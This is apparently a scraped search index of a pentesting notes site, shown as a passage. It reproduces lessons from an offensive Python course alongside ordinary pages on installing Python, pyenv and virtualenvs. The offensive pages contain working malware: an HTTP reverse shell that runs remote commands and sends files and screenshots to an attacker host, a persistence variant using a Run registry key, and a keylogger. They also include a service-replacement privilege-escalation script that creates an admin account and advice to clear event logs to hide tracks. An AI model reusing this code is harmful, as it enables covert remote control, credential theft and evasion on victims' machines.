directory\nimport shutil             # Used to Remove the temp directory\n\n\nwhile True:\n    req = requests.get('http://192.168.0.152:8080')\n    command = req.text\n    if 'terminate' in command:\n        break\n    elif 'grab' in command:\n        grab, path = command.split(\"*\")\n        if os.path.exists(path):\n            url = \"http://192.168.0.152:8080/store\"\n            files = {'file': open(path, 'rb')}\n            r = requests.post(url, files=files)\n        else:\n            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())\n\n    elif 'screencap' in command: #If we got a screencap keyword, then ..\n\n        dirpath = tempfile.mkdtemp() #Create a temp dir to store our screenshot file\n        ImageGrab.grab().save(dirpath + \"\\img.jpg\", \"JPEG\") #Save the screencap in the temp dir\n\n        url = \"http://192.168.0.152:8080/store\"\n        files = {'file': open(dirpath + \"\\img.jpg\", 'rb')}\n        r = requests.post(url, files=files) #Transfer the file over our HTTP\n\n        files['file'].close() #Once the file gets transfered, close the file.\n        shutil.rmtree(dirpath) #Remove the entire temp dir\n\n    else:\n        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())\n    time.sleep(3)\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","screenshot capturer"]},{"location":"python/making-your-binary-persistent/","title":"Making your binary persistent","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <p>In order for a binary to persist, the binary must do three things:</p> <p>1. To copy itself into a different location. We need source path (current working directory) and destination path, for instance, the Document folder. This means that we need to know the username: </p> <pre><code>```cmd\n    c:\\Users\\&lt;username&gt;\\Documents\n```\n</code></pre> <p>2. To add a registry key pointing to our new exe location. This is done only the first time.</p> <p>3. For consecutive times, we have to avoid repeating steps 1 and 2.</p>","tags":["python","python pentesting","scripting","reverse shell","persistence","registry"]},{"location":"python/making-your-binary-persistent/#phases-for-persistence","title":"Phases for persistence","text":"","tags":["python","python pentesting","scripting","reverse shell","persistence","registry"]},{"location":"python/making-your-binary-persistent/#1-system-recognition","title":"1. System recognition","text":"<p>Getting to know the current working directory + the user profile.</p>","tags":["python","python pentesting","scripting","reverse shell","persistence","registry"]},{"location":"python/making-your-binary-persistent/#2-copy-the-binary-to-a-different-location","title":"2. Copy the binary to a different location","text":"<p>If the binary is not found in the destination folder, we can assume this is the first time we're running it. Then:</p> <p>We will copy the binary to a different location. For that, we need a source path (current working directory) and a destination path, for instance, the Document folder. This means that we need to know the current working directory (for the source path)  and the username (for the destination path): </p> <pre><code>```cmd\n    c:\\Users\\&lt;username&gt;\\Documents\n```\n</code></pre> <p>This information was already retrieved in step 1 (System recognition).</p>","tags":["python","python pentesting","scripting","reverse shell","persistence","registry"]},{"location":"python/making-your-binary-persistent/#3-add-a-registry-key","title":"3. Add a Registry key","text":"<p>If the binary is not found in the destination folder, we can assume this is the first time we're running it. Then:</p> <p>We will add a Registry key.</p>","tags":["python","python pentesting","scripting","reverse shell","persistence","registry"]},{"location":"python/making-your-binary-persistent/#4-fire-up-our-shell","title":"4. Fire up our shell","text":"","tags":["python","python pentesting","scripting","reverse shell","persistence","registry"]},{"location":"python/making-your-binary-persistent/#client-side","title":"Client side","text":"<p>To be run on our victim's machine.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\nimport requests\nimport os\nimport subprocess\nimport time\nimport shutil \nimport winreg as wreg\n\n#Reconn Phase\npath = os.getcwd().strip('/n')\n\nNull, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')\n\ndestination = userprof.strip('\\n\\r') + '\\\\Documents\\\\' + 'client.exe'\n\n#If it was the first time our backdoor gets executed, then Do phase 1 and phase 2 \nif not os.path.exists(destination):\n    shutil.copyfile(path+'\\client.exe', destination) #You can replace   path+'\\client.exe' with sys.argv[0] ---&gt; the sys.argv[0] will return the file name\n\n    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", 0, wreg.KEY_ALL_ACCESS)\n    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)\n    key.Close()\n\n\n\n#Last phase is to start a reverse connection back to our kali machine\n\nwhile True:\n    req = requests.get('http://192.168.0.152:8080')\n    command = req.text\n    if 'terminate' in command:\n        break\n    elif 'grab' in command:\n        grab, path = command.split(\"*\")\n        if os.path.exists(path):\n            url = \"http://192.168.0.152:8080/store\"\n            files = {'file': open(path, 'rb')}\n            r = requests.post(url, files=files)\n        else:\n            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())\n    else:\n        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())\n    time.sleep(3)\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","persistence","registry"]},{"location":"python/man-in-the-browser-attack/","title":"Man in the browser attack","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <p>All the browsers offer to save username/password when you submit these data into a login page, so on the next time you visit the same login page you will see your username/password are automatically filled in without typing a single letter. Also, there's third party software like lastpass can do the same job for you.  </p> <p>If the target was using this method for login, then neither the keylogger nor the clipboard methods will work.  </p> <p>Modern hackers have invented a new attack called -man in the browser- to overcome the above scenario.</p> <p>In a nutshell, man in the browser attack intercepts the browser API calls and extracts the data (clear text) before it's getting out to the network socket (SSL encrypted).</p>","tags":["python","python pentesting","techniques","firefox","browsers"]},{"location":"python/man-in-the-browser-attack/#steps-to-intercept-a-process-api-calls-are-","title":"Steps to intercept a process API calls are:-","text":"<p>A. Get the Process ID (PID) of the browser process </p> <p>B. Attach a debugger to this PID </p> <p>C. Specify the DLL library that you want to intercept </p> <p>D. Specify the function name and resolve its memory  address </p> <p>E. Set BreakPoint and register a call back function  </p> <p>F. Wait for debug events using debug loop </p> <p>G. Once the debug event occur ( meaning once the browser  calls the function inside the DLL),  execute the call back function </p> <p>H. Return the original process   </p>","tags":["python","python pentesting","techniques","firefox","browsers"]},{"location":"python/pip/","title":"Pip","text":"","tags":["python","scripting","package manager"]},{"location":"python/pip/#installation","title":"Installation","text":"","tags":["python","scripting","package manager"]},{"location":"python/pip/#basic-usage","title":"Basic usage","text":"","tags":["python","scripting","package manager"]},{"location":"python/pip/#some-interesting-libraries","title":"Some interesting libraries","text":"Library What it does Install More Info Pillow Pillow\u00a0and its predecessor,\u00a0PIL, are the original Python\u00a0libraries for dealing with images. pip install Pillow https://realpython.com/image-processing-with-the-python-pillow-library/","tags":["python","scripting","package manager"]},{"location":"python/privilege-escalation/","title":"Privilege escalation - Weak service file permission","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","windows privilege escalation","privilege escalation"]},{"location":"python/privilege-escalation/#setting-up-the-lab","title":"Setting up the lab","text":"<p>1. Download vulnerable application from https://www.exploit-db.com/exploits/24872 and install it for all users on a windows VM.</p> <p>2. Create a non admin account in the Windows VM. For instance: - user: nonadmin - password: 123123</p> <p>3. Restart the windows VM and login as nonadmin user.</p> <p>4. Open the PhotoDex application and in Task Manager locate the service that gets created by the application. It's called ScsiAccess.\u00e7</p> <p>5. Open properties of ScsiAccess service and locate the path to executable. It should be something like:</p> <pre><code>C:\\Program Files\\Photodex\\ProShow PRoducer\\ScsiAccess.exe\n</code></pre> <p>6. We can replace that file with a malicious service file that will be triggered when opening the Photodex application and get us escalated to admin privileges.</p> <p>7. Script for windows 7 app. Go to step 8 for windows 10. Jump to step 9 after this step.</p> <pre><code># Windows 7\nimport servicemanager\nimport win32serviceutil\nimport win32service\nimport win32api\n\nimport os\nimport ctypes\n\nclass Service(win32serviceutil.ServiceFramework):\n    _svc_name_ = 'ScsiAccess'\n    _svc_display_name_ = 'ScsiAccess'\n\n    def __init__(self, *args):\n        win32serviceutil.ServiceFramework.__init__(self, *args)\n\n    def sleep(self, sec):\n        win32api.Sleep(sec*1000, True)\n\n    def SvcDoRun(self):\n\n        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)\n        try:\n            self.ReportServiceStatus(win32service.SERVICE_RUNNING)\n            self.start()\n\n        except:\n            self.SvcStop()\n    def SvcStop(self):\n        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)\n        self.stop()\n        self.ReportServiceStatus(win32service.SERVICE_STOPPEED)\n\n    def start(self):\n        self.runflag=True\n\n        f = open('C:/Users/nonadmin/Desktop/priv.txt', 'w')\n        if ctypes.windll.shell32.IsUserAnAdmin() == 0:\n            f.write('[-] We are NOT admin')\n        else:\n            f.write('[+] We are admin')\n        f.close()\n\n    def stop(self):\n        self.runflag=False\n\nif __name__ == '__main__':\n\n\n    servicemanager.Initialize()\n    servicemanager.PrepareToHostSingle(Service)\n    servicemanager.StartServiceCtrlDispatcher()\n    win32serviceutil.HandleCommandLine(Service)\n</code></pre> <p>We can use py2exe to craft an exe file for that python script:</p> <p>This setup file will convert the python script scsiaccess.py into an exe file:</p> <pre><code>from distutils.core import setup\nimport py2exe, sys, os\n\nsys.arg.append(\"py2exe\")\nsetup(\n      options = {'py2exe': {'bundle_files': 1}},\n      windows = [ {'script': \"scsiaccess.py\"}],\n      zipfule = None\n)\n</code></pre> <p>You can also use pyinstaller:</p> <pre><code>Pyinstaller --onfile Create_New_Admin_account.py\n</code></pre> <p>8. Script for Windows 10:</p> <pre><code># The order of importing libraries matter. \"servicemanager\" should be imported after win32X. As following:-\n\nimport win32serviceutil\nimport win32service\nimport win32api\nimport win32timezone\nimport win32net\nimport win32netcon\nimport servicemanager\n\n## the rest of the code is still the same\nimport os\nimport ctypes\n\nclass Service(win32serviceutil.ServiceFramework):\n    _svc_name_ = 'ScsiAccess'\n    _svc_display_name_ = 'ScsiAccess'\n\n    def __init__(self, *args):\n        win32serviceutil.ServiceFramework.__init__(self, *args)\n\n    def sleep(self, sec):\n        win32api.Sleep(sec*1000, True)\n\n    def SvcDoRun(self):\n\n        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)\n        try:\n            self.ReportServiceStatus(win32service.SERVICE_RUNNING)\n            self.start()\n\n        except:\n            self.SvcStop()\n    def SvcStop(self):\n        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)\n        self.stop()\n        self.ReportServiceStatus(win32service.SERVICE_STOPPEED)\n\n    def start(self):\n        self.runflag=True\n\n        USER = \"Hacked\"\n        GROUP = \"Administrators\"\n        user_info = dict (\n            name = USER,\n            password = \"python\",\n            priv = win32netcon.USER_PRIV_USER,\n            home_dir = None,\n            comment = None,\n            flags = win32netcon.UF_SCRIPT,\n            script_path = None\n             )\n        user_group_info = dict (\n            domainandname = USER\n            )\n        try:\n            win32net.NetUserAdd (None, 1, user_info)\n            win32net.NetLocalGroupAddMembers (None, GROUP, 3, [user_group_info])\n        except Exception, x:\n            pass\n        ''' \n        f = open('C:/Users/nonadmin/Desktop/priv.txt', 'w')\n        if ctypes.windll.shell32.IsUserAnAdmin() == 0:\n            f.write('[-] We are NOT admin')\n        else:\n            f.write('[+] We are admin')\n        f.close()\n        '''\n    def stop(self):\n        self.runflag=False\n\nif __name__ == '__main__':\n\n\n    servicemanager.Initialize()\n    servicemanager.PrepareToHostSingle(Service)\n    servicemanager.StartServiceCtrlDispatcher()\n    win32serviceutil.HandleCommandLine(Service)\n</code></pre> <p>To export into EXE use:</p> <pre><code>Pyinstaller --onfile Create_New_Admin_account.py`\n</code></pre> <p>9. Replace the service file, under</p> <pre><code>C:\\Program Files (x86)\\Photodex\\ProShow Producer`\n</code></pre> <p>10. Rename the original scsiaccess to scsiaccess123.</p> <p>11. Put your Python exe as scsiaccess\u00a0 (without .exe).</p> <p>12. Restart and test- You should see \"Hacked\" account been created.</p>","tags":["python","python pentesting","scripting","windows privilege escalation","privilege escalation"]},{"location":"python/privilege-escalation/#python-script-to-check-if-we-are-admin-users-on-windows","title":"Python script to check if we are admin users on Windows","text":"<pre><code>import ctypes\n    if ctypes.windll.shell32.IsUserAnAdmin() == 0:\n        print '[-] We are NOT admin! '\n    else:\n        print '[+] We are admin :) '\n</code></pre>","tags":["python","python pentesting","scripting","windows privilege escalation","privilege escalation"]},{"location":"python/privilege-escalation/#erasing-tracks","title":"Erasing tracks","text":"<p>Once you are admin, open Event Viewer and go to Windows Logs. Click right button on Applications and Security and the option \"Clear Logs\".</p>","tags":["python","python pentesting","scripting","windows privilege escalation","privilege escalation"]},{"location":"python/pyenv/","title":"Pyenv","text":"<p>Popular Python version management tool. Pyenv allows you to easily install and switch between multiple Python versions on the same machine.</p> <p>Source: https://github.com/pyenv/pyenv</p>"},{"location":"python/pyenv/#installation-in-kali","title":"Installation in Kali","text":"<p>Check out Pyenv where you want it installed. A good place to choose is $HOME/.pyenv (but you can install it somewhere else):</p> <pre><code>git clone https://github.com/pyenv/pyenv.git ~/.pyenv\n</code></pre> <p>Optionally, try to compile a dynamic Bash extension to speed up Pyenv. Don't worry if it fails; Pyenv will still work normally:</p> <pre><code>cd ~/.pyenv &amp;&amp; src/configure &amp;&amp; make -C src\n</code></pre> <p>Define environment variable PYENV_ROOT to point to the path where Pyenv will store its data. $HOME/.pyenv is the default. If you installed Pyenv via Git checkout, we recommend to set it to the same location as where you cloned it.</p> <pre><code>echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' &gt;&gt; ~/.zshrc\n</code></pre> <p>Add the\u00a0<code>pyenv</code>\u00a0executable to your\u00a0<code>PATH</code>\u00a0if it's not already there</p> <pre><code>echo 'command -v pyenv &gt;/dev/null || export PATH=\"$PYENV_ROOT/bin:$PATH\"' &gt;&gt; ~/.zshrc \n</code></pre> <p>run\u00a0<code>eval \"$(pyenv init -)\"</code>\u00a0to install\u00a0<code>pyenv</code>\u00a0into your shell as a shell function, enable shims and autocompletion</p> <pre><code>echo 'eval \"$(pyenv init -)\"' &gt;&gt; ~/.zshrc \n</code></pre> <p>Then, if you have ~/.profile, ~/.bash_profile or ~/.bash_login, add the commands there as well. If you have none of these, add them to ~/.profile. No need in this case, where we have ~/.zshrc.</p> <p>If you wish to get Pyenv in noninteractive login shells as well, also add the commands to ~/.zprofile or ~/.zlogin.</p>"},{"location":"python/pyenv/#basic-usage","title":"Basic usage","text":"<p>Install the desired Python versions using pyenv:</p> <pre><code>pyenv install 3.9.0\n</code></pre> <p>See installed versions:</p> <pre><code>pyenv versions\n</code></pre> <p>Set global python version:</p> <pre><code> pyenv global 2.7.18\n</code></pre>"},{"location":"python/python-installation/","title":"Installing python","text":"","tags":["python","python pentesting","scripting"]},{"location":"python/python-installation/#installing-python-38-on-ubuntu-20045","title":"Installing python 3.8 on Ubuntu 20.04.5","text":"<p>First, update and upgrade:</p> <pre><code>sudo apt update &amp;&amp; sudo apt upgrade\n</code></pre> <p>Add PPA for Python old versions. The old versions of Python such as 3.9, 3.8, 3.7, and older are not available to install using the default system repository of Ubuntu 22.04 LTS Jammy JellyFish or 20.04 Focal Fossa. Hence, we need to add a PPA offered by the \u201cdeadsnakes\u201d team to get the old archived Python versions easily.</p> <pre><code>sudo apt install software-properties-common\n</code></pre> <pre><code>sudo add-apt-repository ppa:deadsnakes/ppa\n\n# If you get this error:\nAttributeError: NoneType object has no attribute people\n# Try Installing  python3-launchpadlib \nsudo apt-get install  python3-launchpadlib \n</code></pre> <p>Check python versions you want. Syntax:</p> <pre><code>sudo apt-cache policy python&lt;version&gt;\n</code></pre> <p>In my case:</p> <pre><code>sudo apt-cache policy python3.9\n</code></pre> <p>Install the version you want:</p> <pre><code>sudo apt install python3.9\n</code></pre> <p>Set up a default version in your system:</p> <pre><code># Checkout existing versions\nls /usr/bin/python*\n\n# Also, let's check out  whether any version is configured as python alternatives or not. For that run:\nsudo update-alternatives --list python\n\n# If the output is: \u201cupdate-alternatives: error: no alternatives for python\u201d. Then it means there are no alternatives that have been configured, hence let\u2019s do some:\nsudo update-alternatives --install /usr/bin/python python /usr/bin/python3.9 1\nsudo update-alternatives --install /usr/bin/python python /usr/bin/python3.10 2\nsudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 3\n\n# Switch the default Python version\u00a0\nsudo update-alternatives --config python\n</code></pre>","tags":["python","python pentesting","scripting"]},{"location":"python/python-installation/#other-methods","title":"Other methods","text":"<p>No very orthodox but:</p> <pre><code># Check current Python pointer\nls -l /usr/bin/python\n\n# Check available Python versions**\nls -l /usr/bin/python*\n\n# Unlink current python version**\ncd /usr/bin\nsudo unlink python\n\n# Select required python version and lin to python command**\nsudo ln -s /usr/bin/python2.7 python\n\n# Confirm change in pointer**\nls -l /usr/bin/python\n</code></pre>","tags":["python","python pentesting","scripting"]},{"location":"python/python-installation/#installing-python-in-kali","title":"Installing python in Kali","text":"<p>If you are on Ubuntu 19.10 (or any other version unsupported by the deadsnakes PPA, like it's the case of Kali), you will not be able to install using the deadsnakes PPA.</p> <p>First, install development packages required to build Python.</p> <pre><code>sudo apt update\nsudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev curl\n</code></pre> <p>Then download the tarball and extract it:</p> <pre><code>wget https://www.python.org/ftp/python/3.9.19/Python-3.9.19.tar.xz\ntar -xf Python-3.9.19.tar.xz\n</code></pre> <p>Once the Python tarball has been extracted, navigate to the configure script and execute it in your Linux terminal with:</p> <pre><code>cd Python-3.9.19\n./configure\n</code></pre> <p>The configuration may take some time. Wait until it is successfully finishes before proceeding.</p> <p>If you want to create an alternative install for python, start the build process: </p> <pre><code>sudo make altinstall\n</code></pre> <p>If you want to replace your current version of Python with this new version, you should uninstall your current Python package using your package manager (such as apt or dnf) and then install:</p> <pre><code>sudo make install\n</code></pre>","tags":["python","python pentesting","scripting"]},{"location":"python/python-installation/#installing-pip","title":"Installing pip","text":"<pre><code>python3 -m pip install pip\n</code></pre> <p>If you get error: externally-managed-environment, then the solution is create an environment. As the message explains, this is actually not an issue with Python   itself, but rather your Linux distribution (Kali, Debian, etc.) implementing a deliberate policy to ensure you don't break your operating system and system packages by using <code>pip</code> (or Poetry, Hatch, PDM or another non-OS package manager) outside the protection of a virtual environment.</p>","tags":["python","python pentesting","scripting"]},{"location":"python/python-installation/#creating-a-virtual-environment","title":"Creating a virtual environment","text":"<p>See virtual Environments.</p>","tags":["python","python pentesting","scripting"]},{"location":"python/python-installation/#switch-python-versions","title":"Switch python versions","text":"<p>See pyenv.</p>","tags":["python","python pentesting","scripting"]},{"location":"python/python-keylogger/","title":"Simple keylogger in python","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n#Ref: https://pythonhosted.org/pynput/keyboard.html#monitoring-the-keyboard\n\nfrom pynput.keyboard import Key, Listener\n\ndef on_press(key):\n    fp=open(\"keylogs.txt\",\"a\") #create a text file and append the key in it\n    print(key)\n    fp.write(str(key)+\"\\n\")\n    fp.close()\n\nwith Listener(on_press=on_press) as listener: # if key is pressed, call on_press function\n    listener.join()\n</code></pre>","tags":["python","python pentesting","scripting","keylogger"]},{"location":"python/python-tools-for-pentesting/","title":"Python tools for pentesting","text":"<p>Tools and techniques to achieve:</p> <ul> <li>Coding your own reverse shell (TCP+HTTP).</li> <li>Exfiltrating data from victim's machine.</li> <li>Using anonymous shell by abusing Twitter, Google Form and Sourceforge.</li> <li>Hacking passwords with different techniques: code a Keylogger, perform Clipboard Hijacking.</li> <li>Bypassing some firewall by including cryptography encryption in your script shells (AES,RSA,XOR)   </li> <li>Writing scripts to perform privilege escalation on windows by abusing a weak service. And more. </li> </ul>","tags":["python","python pentesting","scripting"]},{"location":"python/python-tools-for-pentesting/#contents","title":"Contents","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting"]},{"location":"python/python-tools-for-pentesting/#tools","title":"Tools","text":"","tags":["python","python pentesting","scripting"]},{"location":"python/python-tools-for-pentesting/#pyinstaller","title":"pyinstaller","text":"<p>PyInstaller bundles a Python application and all its dependencies into a single package. The user can run the packaged app without installing a Python interpreter or any modules.</p> <p>See pyinstaller.</p>","tags":["python","python pentesting","scripting"]},{"location":"python/python-tools-for-pentesting/#py2exe","title":"py2exe","text":"<p>This setup file will convert the python script scsiaccess.py into an exe file:</p> <pre><code>from distutils.core import setup\nimport py2exe, sys, os\n\nsys.arg.append(\"py2exe\")\nsetup(\n      options = {'py2exe': {'bundle_files': 1}},\n      windows = [ {'script': \"scsiaccess.py\"}],\n      zipfule = None\n)\n</code></pre>","tags":["python","python pentesting","scripting"]},{"location":"python/python-tools-for-pentesting/#inmunity-debuger","title":"Inmunity Debuger","text":"<p>See Inmunity Debugger.</p>","tags":["python","python pentesting","scripting"]},{"location":"python/python-virtual-environments/","title":"Virtual environments","text":"","tags":["database","relational","database","SQL"]},{"location":"python/python-virtual-environments/#virtualenvwrapper","title":"virtualenvwrapper","text":"","tags":["database","relational","database","SQL"]},{"location":"python/python-virtual-environments/#installation","title":"Installation","text":"<pre><code># Make sure you have pip installed.\nsudo apt-get install python3-pip\n\n# Installing virtualenvwrapper\u00a0\nsudo pip3 install virtualenvwrapper\n\n# Open bashrc by \u2013\nsudo gedit ~/.bashrc\n\n# After opening it, add the following \u00a0lines to it :\n\nexport WORKON_HOME=$HOME/.virtualenvs\nexport PROJECT_HOME=$HOME/Projects\nsource /usr/share/virtualenvwrapper/virtualenvwrapper.sh\n</code></pre>","tags":["database","relational","database","SQL"]},{"location":"python/python-virtual-environments/#basic-usage","title":"Basic usage","text":"<pre><code># Creating a virtual environment with mkvirtualenv\nmkvirtualenv nameOfEnvironment\n\n# List exisiting environment in your \nlsvirtualenv -b\n\n# Work on an environment\nworkon nameOfEnvironment\n\n# Close current environment\ndeactivate\n\n# Delete virtual environment\nrmvirtualenv nameOfEnvironment\n\n# To work on another version of python:\nmkvirtualenv -p python3.x venv_name\n# You will see something like this: (venv_name)\n</code></pre> <p>Backing up virtual environment before removing it:</p> <pre><code>pip freeze &gt; requirements.txt\n</code></pre>","tags":["database","relational","database","SQL"]},{"location":"python/python-virtual-environments/#venv","title":"venv","text":"<pre><code>python3 -m venv &lt;DIR&gt;\nsource &lt;DIR&gt;/bin/activate\n</code></pre> <p>Now you can activate or deactivate the virtual environment with:</p> <pre><code>&lt;DIR&gt;\\Scripts\\activate\n</code></pre>","tags":["database","relational","database","SQL"]},{"location":"python/tcp-reverse-shell-with-aes-encryption/","title":"TCP reverse shell with AES encryption","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. 